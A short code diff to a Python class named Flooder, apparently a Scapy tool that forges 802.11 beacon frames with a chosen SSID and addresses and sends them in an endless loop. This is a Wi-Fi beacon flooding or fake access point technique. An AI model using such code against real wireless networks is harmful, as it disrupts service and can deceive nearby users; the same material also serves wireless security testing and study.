@@ -67,6 +67,7 @@ class Flooder:
 
 
     def beaconSender(self):
+        dot11 = Dot11(type=0, subtype=8, addr1=self.dest_addr, addr2=self.source_addr, addr3=self.source_addr)
         beacon = Dot11Beacon(cap='ESS+privacy')
         dot11elt = Dot11Elt(ID='SSID',info=self.ssid, len=len(self.ssid))
 
@@ -93,7 +94,7 @@ class Flooder:
         # '\x00\x0f\xac\x02'      #Pre-Shared Key
         # '\x00\x00'))            #RSN Capabilities (no extra capabilities)
 
-        frame = RadioTap()/self.dot11/beacon/dot11elt/rsn
+        frame = RadioTap()/dot11/beacon/dot11elt/rsn
         sendp(frame, iface=self.interface, inter=0.1, loop=1)
 
 
